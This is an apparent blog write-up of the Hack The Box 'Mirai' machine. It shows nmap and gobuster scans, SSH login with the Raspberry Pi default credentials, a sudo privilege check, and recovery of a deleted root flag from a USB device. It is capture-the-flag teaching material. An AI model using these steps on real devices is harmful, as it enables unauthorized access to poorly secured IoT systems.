---
layout: single
title: Mirai - Hack The Box
excerpt: "Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide variety of botnets. Internal IoT devices are also being used for long-term persistence by malicious actors."
date: 2025-05-27
classes: wide
header:
  teaser: /img2/mirai.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Gaining SSH Access Using Default Raspberry Credentials
  - Abusing Sudo Group [Privilege Escalation]
  - Recovering Deleted root.txt File through a Connected External Device
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.48
```

![](/img2/Pasted%20image%2020250527133528.png)

- Vulnerability and version scan

```bash
nmap -sCV -p22,53,80,1088,32400 -vvv 10.10.10.48
```

![](/img2/Pasted%20image%2020250527133811.png)

- Whatweb

```bash
whatweb http://10.10.10.48/
```

![](/img2/Pasted%20image%2020250527134820.png)

- Gobuster

```bash
gobuster dir -u http://10.10.10.48/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

![](/img2/Pasted%20image%2020250527143319.png)

![](/img2/Pasted%20image%2020250527143452.png)

## Exploitation

- Connect SSH with Raspberry default credentials

```bash
ssh pi@10.10.10.48
```

> raspberry

## Post-exploitation

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250527145317.png)

- Search root flag

```bash
find / -name root.txt
```

```bash
cat /root/root.txt
```

![](/img2/Pasted%20image%2020250527145415.png)

- List partitions

```bash
lsblk
```

![](/img2/Pasted%20image%2020250527145520.png)

- List content of usb

```bash
cat /media/usbstick/damnit.txt
```

![](/img2/Pasted%20image%2020250527145645.png)

- View deleted content

```bash
strings /dev/sdb
```

![](/img2/Pasted%20image%2020250527145754.png)

![](/img2/Pasted%20image%2020250527145120.png)